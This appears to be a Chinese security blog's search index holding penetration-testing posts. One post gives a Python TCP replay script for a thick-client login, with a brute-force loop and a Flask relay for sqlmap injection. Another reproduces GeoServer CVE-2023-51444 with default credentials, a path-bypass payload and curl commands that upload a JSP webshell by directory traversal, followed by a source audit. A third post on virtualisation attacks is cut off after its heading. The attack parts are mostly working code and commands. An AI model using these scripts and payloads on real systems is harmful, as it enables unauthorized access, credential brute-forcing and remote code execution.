<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>TCP应用SQL注入</title>
    <url>/2024/07/04/TCP%E5%BA%94%E7%94%A8SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="基础信息"><a href="#基础信息" class="headerlink" title="基础信息"></a>基础信息</h1><p>应用类型：EXE<br>协议：TCP<br>后端地址：192.168.103.174:400</p>
<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><p>TCP连接基础知识：<br>TCP连接的建立和关闭遵循以下顺序：</p>
<ol>
<li>客户端发起连接请求：客户端向服务器端发送一个SYN包（同步包）。</li>
<li>服务器端响应连接请求：服务器端收到客户端发送的SYN包后，向客户端发送一个SYN-ACK包（同步-确认包）。</li>
<li>客户端确认连接：客户端收到服务器端发送的SYN-ACK包后，向服务器端发送一个ACK包（确认包），完成连接的建立。</li>
<li>数据传输：建立连接后，客户端和服务器端可以进行数据传输。</li>
<li>连接关闭：当数据传输完成后，需要关闭连接。</li>
<li>客户端发起关闭连接请求：客户端向服务器端发送一个FIN包（结束包）。</li>
<li>服务器端响应关闭请求：服务器端收到客户端发送的FIN包后，向客户端发送一个ACK包，表示确认收到关闭请求。</li>
<li>服务器端关闭连接：服务器端向客户端发送一个FIN包。</li>
<li>客户端响应关闭请求：客户端收到服务器端发送的FIN包后，向服务器端发送一个ACK包，完成连接的关闭。</li>
</ol>
<p>当前数据连接记录：<br><img src="/images/Pasted%20image%2020240331224246.png"></p>
<p>使用wireshark抓包，追踪登陆点TCP流：<br><img src="/images/Pasted%20image%2020240331224030.png"></p>
<p>转换为：raw模式（hex）<br>蓝色为响应，红色为发送包<br><img src="/images/Pasted%20image%2020240331224424.png"></p>
<p>可以逐步构建脚本，尝试重发此TCP数据包</p>
<ul>
<li><p>创建TCP连接</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">username</span>):</span><br><span class="line">    <span class="comment"># 定义目标主机和端口</span></span><br><span class="line">    target_host = <span class="string">&#x27;192.168.103.174&#x27;</span></span><br><span class="line">    target_port = <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个socket对象</span></span><br><span class="line">    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 连接到目标主机和端口</span></span><br><span class="line">    client.connect((target_host, target_port))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送第一条数据</span></span><br><span class="line">    client.send(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment"># 接收第一次响应数据</span></span><br><span class="line">    response1 = client.recv(<span class="number">4096</span>)</span><br><span class="line">    <span class="comment"># print(response1)</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>发送第一个数据包：<br>对应这个数据<br><img src="/images/Pasted%20image%2020240331224807.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 第二次发送</span></span><br><span class="line">hex_data2 = <span class="string">&#x27;00000300102713000000494e49545f696e69745f494e4954004e020000&#x27;</span></span><br><span class="line">decoded_data = <span class="built_in">bytes</span>.fromhex(hex_data2)</span><br><span class="line">client.send(decoded_data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收第二次响应数据</span></span><br><span class="line">response2 = client.recv(<span class="number">4096</span>)</span><br><span class="line"><span class="comment"># print(response2)</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>接下来以此类推，完整发包</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">username</span>):</span><br><span class="line">    <span class="comment"># 定义目标主机和端口</span></span><br><span class="line">    target_host = <span class="string">&#x27;192.168.103.174&#x27;</span></span><br><span class="line">    target_port = <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个socket对象</span></span><br><span class="line">    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 连接到目标主机和端口</span></span><br><span class="line">    client.connect((target_host, target_port))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送第一条数据</span></span><br><span class="line">    client.send(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment"># 接收第一次响应数据</span></span><br><span class="line">    response1 = client.recv(<span class="number">4096</span>)</span><br><span class="line">    <span class="comment"># print(response1)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第二次发送</span></span><br><span class="line">    hex_data2 = <span class="string">&#x27;00000300102713000000494e49545f696e69745f494e4954004e020000&#x27;</span></span><br><span class="line">    decoded_data = <span class="built_in">bytes</span>.fromhex(hex_data2)</span><br><span class="line">    client.send(decoded_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 接收第二次响应数据</span></span><br><span class="line">    response2 = client.recv(<span class="number">4096</span>)</span><br><span class="line">    <span class="comment"># print(response2)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第三次发送</span></span><br><span class="line">    hex_data3 = <span class="string">&#x27;0000030011274ef436c69656e74000100000020002001000000000000000000000000000000000000000000000000000000000000000000000000000000000000006c7a7570636f00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000061646d696e00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000653130616463333934396261353961626265353665303537663230663838336500404c4f47494e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000303035303536633030303031000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line">    original_bytes = <span class="built_in">bytes</span>.fromhex(hex_data3)</span><br><span class="line">    <span class="comment"># 要替换的部分</span></span><br><span class="line">    replacement_part = <span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(username)</span><br><span class="line">    <span class="comment"># 将要替换的部分转换为字节数据</span></span><br><span class="line">    replacement_bytes = <span class="built_in">bytes</span>.fromhex(replacement_part)</span><br><span class="line">    replace_index = original_bytes.index(<span class="string">b&#x27;\x61\x64\x6d\x69\x6e&#x27;</span>)</span><br><span class="line">    <span class="comment"># 进行替换</span></span><br><span class="line">    new_bytes = original_bytes[:replace_index] + replacement_bytes + original_bytes[replace_index + <span class="built_in">len</span>(replacement_bytes):]</span><br><span class="line">    new_hex_string = new_bytes.<span class="built_in">hex</span>()</span><br><span class="line">    <span class="comment"># print(bytes.fromhex(new_hex_string).decode(&#x27;ascii&#x27;))</span></span><br><span class="line">    client.send(<span class="built_in">bytes</span>.fromhex(new_hex_string))</span><br><span class="line">    response3 = client.recv(<span class="number">4096</span>)</span><br><span class="line">    <span class="comment"># print(bytes.fromhex(response3.hex()).decode(&#x27;ascii&#x27;))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第4次发送</span></span><br><span class="line">    hex_data4 = <span class="string">&#x27;0000030012270b000000454e445f656e645f454e44&#x27;</span></span><br><span class="line">    decoded_data = <span class="built_in">bytes</span>.fromhex(hex_data4)</span><br><span class="line">    client.send(decoded_data)</span><br><span class="line">    response4 = client.recv(<span class="number">4096</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(response4.<span class="built_in">hex</span>()).decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line">    out = <span class="built_in">bytes</span>.fromhex(response4.<span class="built_in">hex</span>()).decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    <span class="comment"># if &quot;NOUSER&quot; not in  str(bytes.fromhex(response4.hex()).decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;)):</span></span><br><span class="line">    <span class="comment">#     print(&quot;Success:&quot;,username)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第5次发送</span></span><br><span class="line">    hex_data5 = <span class="string">&#x27;000003001327040000006e657874&#x27;</span></span><br><span class="line">    decoded_data = <span class="built_in">bytes</span>.fromhex(hex_data5)</span><br><span class="line">    client.send(decoded_data)</span><br><span class="line">    response5 = client.recv(<span class="number">4096</span>)</span><br><span class="line">    <span class="comment"># print(response5.hex())</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 关闭连接</span></span><br><span class="line">    client.close()</span><br><span class="line">    <span class="keyword">return</span> out</span><br></pre></td></tr></table></figure></li>
</ul>
<p>在实际测试中存在各样问题，例如：我流量使用的用户名是admin，如果我在数据包中直接替换admin为admins，程序将会无法正常响应，原因是因为如果数据包的长度发生改变，客户端接受将可能出现问题，<strong>下面仅作为事例</strong>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># admin</span></span><br><span class="line">00000300102713000000494e49545f696e69745f494e4954004e020000</span><br><span class="line"><span class="comment"># admins</span></span><br><span class="line">00000300102713000000494e49545f696e69745f494e4954004e02670000</span><br></pre></td></tr></table></figure>
<p>假设<code>f696e69745f494e4954004e02</code>是admin，我将用户名替换为admins将会把流量多加了两位（非专业言论，仅做解释）<code>f696e69745f494e4954004e0267</code>。</p>
<p>问题解决：<br>使用wireshark抓包，分别抓用户名是admin和admins时的数据包，对比其变化：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># admin</span></span><br><span class="line"><span class="number">0000030011274e02000000000000410200004</spanf436c69656e74000100000020002001000000000000000000000000000000000000000000000000000000000000000000000000000000000000006c7a7570636f00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000061646d696e00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000653130616463333934396261353961626265353665303537663230663838336500404c4f47494e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000303035303536633030303031000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line"></span><br><span class="line"><span class="comment"># admins</span></span><br><span class="line"><span class="number">0000030011274e02000000000000410200004</spanf436c69656e74000100000020002001000000000000000000000000000000000000000000000000000000000000000000000000000000000000006c7a7570636f00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000061646d696e73000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000653130616463333934396261353961626265353665303537663230663838336500404c4f47494e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000303035303536633030303031000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br></pre></td></tr></table></figure>
<p>区别在于：admins多出来的s实际上是占用了后面的00<br><img src="/images/Pasted%20image%2020240331225732.png"></p>
<p>了解到了区别也就好调试了，修改替换部分代码：<br><img src="/images/Pasted%20image%2020240331225936.png"></p>
<p>接着就可以简单写个for循环去调用send_data进行暴力破解了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> user <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;常用用户名.txt&quot;</span>).readlines():</span><br><span class="line">    u = <span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(user)</span><br><span class="line">    user = u.strip().encode().<span class="built_in">hex</span>()</span><br><span class="line">    o = send_data(user)</span><br></pre></td></tr></table></figure>
<p><img src="/images/Pasted%20image%2020240331230511.png"></p>
<p>此外还可以写个flask，接受下参数，再中转给send_data方法，这样就可以使用sqlmap跑注入了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">id</span> = request.args.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    u = <span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>)</span><br><span class="line">    user = u.strip().encode().<span class="built_in">hex</span>()</span><br><span class="line">    o = send_data(user)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;<span class="subst">&#123;o&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/images/Pasted%20image%2020240331230710.png"></p>
]]></content>
  </entry>
  <entry>
    <title>【1day】Geoserver（CVE-2023-51444）审计复现</title>
    <url>/2024/07/04/1day-Geoserver%EF%BC%88CVE-2023-51444%EF%BC%89%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="基础介绍"><a href="#基础介绍" class="headerlink" title="基础介绍"></a>基础介绍</h1><ul>
<li>版本范围<br>GeoServer &lt; 2.23.4<br>2.24.0 &lt;&#x3D; GeoServer &lt; 2.24.1</li>
</ul>
<hr>
<p><strong>说明:</strong>   GeoServer是一个用Java编写的开源软件服务器，允许用户共享和编辑地理空间数据。2.23.4和2.24.1之前的版本中存在一个任意文件上载漏洞，该漏洞使具有通过REST coverage Store API修改覆盖范围存储权限的经过身份验证的管理员能够将任意文件内容上载到任意文件位置，从而导致远程代码执行。使用相对路径配置的覆盖率存储使用具有验证功能的GeoServer Resource实现来防止路径遍历，但使用绝对路径配置的复盖率存储使用不防止路径遍历的不同Resource实现。此漏洞可导致执行任意代码。权限有限的管理员也可能利用此漏洞覆盖GeoServer安全文件并获得完全的管理员权限。版本2.23.4和2.24.1包含此问题的修复程序。<br><strong>Published:</strong>  2024-03-20<br><strong>Base Score:</strong>    7.2<br><strong>Base Severity:</strong> HIGH<br>注：个人认为，此漏洞需要web管理员权限，其实风险也没那么高</p>
<hr>
<h1 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h1><p>默认账号密码：admin&#x2F;geoserver<br><img src="/images/Pasted%20image%2020240421152834.png"><br>登陆后台<br><img src="/images/Pasted%20image%2020240421152849.png"></p>
<p>新建一个工作空间<br><img src="/images/Pasted%20image%2020240421153420.png"></p>
<p>新建一个存储仓库<br><img src="/images/Pasted%20image%2020240421153505.png"></p>
<p>工作空间还有数据源名称随便写：<br><img src="/images/Pasted%20image%2020240421153738.png"></p>
<p>连接参数URL，此处比较关键：<br>点击浏览，由于不同系统的数据目录也不同，所以此处我们需要确定数据目录在哪个文件夹(需要绝对路径)<br><img src="/images/Pasted%20image%2020240421154114.png"><br>通常数据目录在tomcat同级目录下，点击浏览目录的同时也可以找找网站目录在哪，后面会用上：<br><img src="/images/Pasted%20image%2020240421154208.png"></p>
<p><strong>选择数据目录下任意目录</strong>：<br><img src="/images/Pasted%20image%2020240421154924.png"><br>此处我选择的目录是这里，复制绝对路径：&#x2F;opt&#x2F;geoserver_data&#x2F;coverages&#x2F;img_sample&#x2F;<br><strong>需要注意的是：复制的绝对路径一定要在数据目录下</strong>，以防后面无法上传</p>
<p>编辑下找到的绝对路径：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原始：/opt/geoserver_data/coverages/img_sample/</span><br><span class="line"></span><br><span class="line">修改后（在主数据目录后添加//////././././././././././）：file:/opt/geoserver_data/////////////////./././././././././././coverages/mosaic_sample</span><br></pre></td></tr></table></figure>

<p>粘贴到连接URL中，点击保存即可：<br><img src="/images/Pasted%20image%2020240421155732.png"></p>
<p>然后就可以上传webshell了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -v -H <span class="string">&quot;Content-Type: multipart/form-data&quot;</span> -u <span class="string">&quot;admin:geoserver&quot;</span> --data-binary @e.txt <span class="string">&#x27;http://127.0.0.1:9991/geoserver/rest/workspaces/testing/coveragestores/test2/file.imagemosaic?filename=../../../../../../../opt/apache-tomcat-9.0.86/webapps/hello/attack.jsp&#x27;</span></span><br></pre></td></tr></table></figure>
<p>简单解释下：</p>
<blockquote>
<p>-v 显示请求响应详情<br>-H 使用multipart&#x2F;form-data的方式上传文件<br>-u 权限验证<br>–data-binary 指定上传的文件<br>&#x2F;geoserver&#x2F;rest&#x2F;workspaces&#x2F;testing&#x2F;coveragestores&#x2F;test2&#x2F;file.imagemosaic 其中testing是你创建的工作空间名，test2是创建的存储仓库名称。<br>filename 目录穿越上传文件</p>
</blockquote>
<p><img src="/images/Pasted%20image%2020240421160535.png"><br><img src="/images/Pasted%20image%2020240421160547.png"></p>
<h1 id="审计过程"><a href="#审计过程" class="headerlink" title="审计过程"></a>审计过程</h1><blockquote>
<p>本文审计基于：<a href="https://mp.weixin.qq.com/s/tLXlemWT1Suius0necplEw">https://mp.weixin.qq.com/s/tLXlemWT1Suius0necplEw</a></p>
</blockquote>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载源码<br><img src="/images/Pasted%20image%2020240421161429.png"></p>
<p>idea打开后，maven依赖自动拉取下：<br><img src="/images/Pasted%20image%2020240421161621.png"></p>
<p>Docker下载并运行对应版本geoserver</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull docker.osgeo.org/geoserver:2.22.x</span><br><span class="line">docker run -it -d -p 9991:8080 -p 5005:5005 docker.osgeo.org/geoserver:2.22.x</span><br></pre></td></tr></table></figure>
<p><img src="/images/Pasted%20image%2020240421162232.png"></p>
<p>IDEA配置远程调试：<br><img src="/images/Pasted%20image%2020240421162729.png"></p>
<p>进入docker，编辑tomcat启动配置开启远程调试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it 容器<span class="built_in">id</span> bash</span><br></pre></td></tr></table></figure>
<p>进入tomcat bin目录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim catalina.sh</span><br></pre></td></tr></table></figure>

<p>添加命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> JAVA_OPTS=<span class="string">&quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/Pasted%20image%2020240421163053.png"></p>
<p>接着重启docker调试环境就好了，下断点，点击debug连接远程tomcat即可<br><img src="/images/Pasted%20image%2020240421163329.png"><br><img src="/images/Pasted%20image%2020240421163344.png"></p>
<h2 id="开始审计"><a href="#开始审计" class="headerlink" title="开始审计"></a>开始审计</h2><h3 id="定位漏洞代码位置"><a href="#定位漏洞代码位置" class="headerlink" title="定位漏洞代码位置"></a>定位漏洞代码位置</h3><p>首先是官方给出的payload：<br><a href="https://github.com/geoserver/geoserver/security/advisories/GHSA-9v5q-2gwq-q9hq">https://github.com/geoserver/geoserver/security/advisories/GHSA-9v5q-2gwq-q9hq</a><br><img src="/images/Pasted%20image%2020240421161205.png"><br>据说是无法成功的，但也不一定。</p>
<p>根据poc可找到对应代码位置：org.geoserver.rest.catalog.CoverageStoreFileController<br><img src="/images/Pasted%20image%2020240421163711.png"></p>
<h3 id="接口获取"><a href="#接口获取" class="headerlink" title="接口获取"></a>接口获取</h3><p>其中<code>workspaceName、storeName、method、format</code>需自行控制。<br>全局搜索<code>/coveragestores/</code>查找有没有让我能直接知道这些参数是干嘛的地方<br><img src="/images/Pasted%20image%2020240421164120.png"></p>
<p>找到了一些接口地址，但是访问就G：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -v -H <span class="string">&quot;Content-Type: multipart/form-data&quot;</span> -u <span class="string">&quot;admin:geoserver&quot;</span> --data-binary @e.txt <span class="string">&#x27;http://127.0.0.1:9991/geoserver/rest/workspaces/gs/coveragestores/watertemp2/file.imagemosaic?filename=22.txt&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/Pasted%20image%2020240421171649.png"><br>具体做校验的代码入口：org.geoserver.rest.ResourceNotFoundException<br><img src="/images/Pasted%20image%2020240421172314.png"></p>
<p>随后黑盒获取到一些信息：<br>直接访问<a href="http://127.0.0.1:9991/geoserver/rest/workspaces/">http://127.0.0.1:9991/geoserver/rest/workspaces/</a> 会将workspaces接口值显示出来<br><img src="/images/Pasted%20image%2020240421172445.png"><br>点进某一个workspaces会将store的接口地址显示出来<br><img src="/images/Pasted%20image%2020240421172728.png"></p>
<p>页面中有DataStores和CoverageStores，直接一个一个store来尝试上传<br>发现CoverageStores的值可以用来上传，后面得知CoverageStores就是存储仓库，而workspaces是工作空间，DataStores是数据源：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -v -H <span class="string">&quot;Content-Type: multipart/form-data&quot;</span> -u <span class="string">&quot;admin:geoserver&quot;</span> --data-binary @e.txt <span class="string">&#x27;http://127.0.0.1:9991/geoserver/rest/workspaces/sf/coveragestores/sfdem/file.imagemosaic?filename=22.txt&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/Pasted%20image%2020240421173036.png"><br>此处可正常上传文件并上传成功，和大师傅的405还是有区别的，触发405的原因应该是存储仓库的类型不同，此处是类型是：ImageMosaic。<br><img src="/images/Pasted%20image%2020240421174523.png"></p>
<p>此时虽然可以上传成功，但是目前是无法通过修改filename参数做到目录穿越上传webshell的，因为有验证：<br><img src="/images/Pasted%20image%2020240421175935.png"></p>
<h3 id="程序执行流程"><a href="#程序执行流程" class="headerlink" title="程序执行流程"></a>程序执行流程</h3><p>由于无法目录穿越做到上传文件，此处对整个程序执行流程过一遍。<br>请求参数的获取：controller<br><img src="/images/Pasted%20image%2020240422103645.png"></p>
<p>判断<code>workspaceName</code>和<code>storeName</code>是否存在<br><img src="/images/Pasted%20image%2020240422103917.png"></p>
<p>对数据内容进行一些验证和处理，此处不追进去看了：org.geoserver.catalog.CoverageStoreInfo#getGridCoverageReader<br><img src="/images/Pasted%20image%2020240422104621.png"></p>
<p>接着开始上传数据<br>org.geoserver.rest.catalog.CoverageStoreFileController#doFileUpload<br><img src="/images/Pasted%20image%2020240422104810.png"></p>
<p>追一下doFileUpload方法<br>调用org.geoserver.rest.util.RESTUtils#createUploadRoot<br><img src="/images/Pasted%20image%2020240422105422.png"></p>
<p>createUploadRoot对<code>workspaceName</code>和<code>storeName</code>进行一些获取和验证<br><img src="/images/Pasted%20image%2020240422105808.png"></p>
<p>追进geturl，这里代码比较多，总而言之其作用是获取数据的存储路径：<code>file:data/sf/sfdem/</code><br><img src="/images/Pasted%20image%2020240422110658.png"></p>
<p>此时path值：<code>data/sf/sfdem</code><br>追进fromPath函数，位置：<code>org.geoserver.platform.resource.Resources#fromPath(java.lang.String, org.geoserver.platform.resource.Resource)</code><br><img src="/images/Pasted%20image%2020240422111402.png"></p>
<p>其中file.isAbsolute()会判断当前路径是绝对路径还是相对路径，显然这个是相对路径，进入到：<code>org.geoserver.platform.resource.Resource#get</code><br><img src="/images/Pasted%20image%2020240422111711.png"><br>return<br><img src="/images/Pasted%20image%2020240422111940.png"><br>接着走，此步骤最终返回directory地址<br><img src="/images/Pasted%20image%2020240422112952.png"></p>
<p>接着开始上传操作：<code>org.geoserver.rest.catalog.AbstractStoreUploadController#handleFileUpload</code><br><img src="/images/Pasted%20image%2020240422113911.png"><br>调用<code>org.geoserver.rest.util.RESTUtils#handleBinUpload(java.lang.String, org.geoserver.platform.resource.Resource, boolean, javax.servlet.http.HttpServletRequest, java.lang.String)</code><br>追进来<br><img src="/images/Pasted%20image%2020240422114211.png"></p>
<p>调用了<code>org.geoserver.platform.resource.Resource#get</code><br><img src="/images/Pasted%20image%2020240422114352.png"><br>追进去<br><img src="/images/Pasted%20image%2020240422114444.png"><br>对上传文件名进行处理，接着进去：<code>org.geoserver.platform.resource.Paths#path(java.lang.String...)</code><br><img src="/images/Pasted%20image%2020240422114843.png"></p>
<p>实际上这里是对上传地址信息进行检查，检查的几个项目正则：<br><img src="/images/Pasted%20image%2020240422115020.png"><br><img src="/images/Pasted%20image%2020240422115031.png"><br>通过检查后返回<code>RESTUtils.java</code>,然后判断文件是否存在，存在的话就删除原文件。<br><img src="/images/Pasted%20image%2020240422115459.png"></p>
<p>接着往下走，如果是zip会对zip进行解压等操作：<br><img src="/images/Pasted%20image%2020240422115647.png"></p>
<p>最后文件上传成功，实际上最关键的地方在于<code>org.geoserver.platform.resource.Paths#path(java.lang.String...)</code>对上传路径的过滤，文件名中包含..等内容肯定是不行的。</p>
<p>程序进入过滤函数的流程：<br><code>org.geoserver.platform.resource.Resources#fromPath(java.lang.String, org.geoserver.platform.resource.Resource)</code><br>-&gt;<code>org.geoserver.platform.resource.FileSystemResourceStore.FileSystemResource#get</code><br>-&gt;<br><code>org.geoserver.platform.resource.Paths#path(java.lang.String...)</code><br>-&gt;<br><code>org.geoserver.platform.resource.Paths#path(boolean, java.lang.String...)</code><br>-&gt;<br><code>org.geoserver.platform.resource.Paths#toPath</code>(这里就是过滤了)</p>
<p>在<code>org.geoserver.platform.resource.Resources#fromPath(java.lang.String, org.geoserver.platform.resource.Resource)</code>部分做了一次判断，如果<code>file</code>是绝对路径则不会进入<code>relativeDir.get</code>。<br><img src="/images/Pasted%20image%2020240422150028.png"></p>
<p>所以如何让<code>path</code>变量是个绝对路径呢？</p>
<p>可以注意到实际最终上传一定是通过拼接等方式将文件上传到了：<code>/opt/geoserver_data/data/sf/sfdem</code></p>
<p>在程序获取上传路径时，实际路径的组成是：<br>数据文件夹：<code>/opt/geoserver_data</code><br>用户自定义目录：<code>/data/sf/sfdem</code></p>
<p>然后发现实际此处功能位于存储仓库：<a href="http://127.0.0.1:9991/geoserver/web/wicket/bookmarkable/org.geoserver.web.data.store.StorePage?5&filter=false">http://127.0.0.1:9991/geoserver/web/wicket/bookmarkable/org.geoserver.web.data.store.StorePage?5&amp;filter=false</a><br><img src="/images/Pasted%20image%2020240422153619.png"><br>其中存储仓库可自定义上传路径，但经过实测无法定义到除了数据目录以外的其他目录<br><img src="/images/Pasted%20image%2020240422155016.png"></p>
<p>既然只要路径是绝对路径，那将此处连接地址替换成数据目录的绝对路径就可以了（我是这么想的）<br><img src="/images/Pasted%20image%2020240422155750.png"></p>
<p>点击保存后发现，再次编辑，tmd程序还是将路径处理了，再次变回相对路径。<br><img src="/images/Pasted%20image%2020240422155902.png"></p>
<p>那么有没有办法绕过程序处理，自定义一个绝对路径上去呢？<br>在耗光200根头发后，成功找到了绕过方式：<br>已知数据绝对路径：<code>/opt/geoserver_data/data/sf/sfdem/</code><br>程序会自动将路径分为：<code>/opt/geoserver_data/</code>和<code>data/sf/sfdem/</code><br>绕过payload，使用杂乱数据扰乱路径（注意前面要加file:可绕过路径的其中一个处理过程）：<code>file:/opt/geoserver_data/././././././././/////////data/sf/sfdem/</code><br>此时就保存成功了，再次debug下，成功进入<code>return Files.asResource(file);</code><br><img src="/images/Pasted%20image%2020240422163447.png"><br>接下来就可以..&#x2F;穿越目录上传了：<br><img src="/images/Pasted%20image%2020240422163542.png"></p>
<h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><p>在最开始的漏洞利用过程中讲到，自己创建工作空间和数据源目录穿越上传做到getshell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -v -H <span class="string">&quot;Content-Type: multipart/form-data&quot;</span> -u <span class="string">&quot;admin:geoserver&quot;</span> --data-binary @e.txt <span class="string">&#x27;http://127.0.0.1:9991/geoserver/rest/workspaces/testing/coveragestores/test2/file.imagemosaic?filename=../../../../../../../opt/apache-tomcat-9.0.86/webapps/hello/attack.jsp&#x27;</span></span><br></pre></td></tr></table></figure>

<p>在审计过程中演示的是程序内置的工作空间和数据源</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -v -H <span class="string">&quot;Content-Type: multipart/form-data&quot;</span> -u <span class="string">&quot;admin:geoserver&quot;</span> --data-binary @e.txt <span class="string">&#x27;http://127.0.0.1:9991/geoserver/rest/workspaces/sf/coveragestores/sfdem/file.imagemosaic?filename=../../../../../../../opt/apache-tomcat-9.0.86/webapps/hello/attack.jsp&#x27;</span></span><br></pre></td></tr></table></figure>

<p>那么我们有办法做到直接请求不访问web页面然后目录穿越上传文件吗？<br>回到官方POC：<br><img src="/images/Pasted%20image%2020240421161205.png"></p>
<p>在上面审计过程中提到如果上传文件类型是zip，那么程序会对其进行解压。此外从官方POC中也说了，使用PUT可创建<code>workspaceName</code>和<code>store</code>。</p>
]]></content>
  </entry>
  <entry>
    <title>虚拟化应用攻击策略</title>
    <url>/2024/07/08/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB%E7%AD%96%E7%95%A5/</url>
    <content><![CDATA[<h1 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h1><p>此环境使用系统为：瑞友天翼应用虚拟化系统<br><img src="/images/Pasted%20image%2020240708135627.png"></p>
<h1 id="攻击策略"><a href="#攻击策略" class="headerlink" title="攻击策略"></a>攻击策略</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><blockquote>
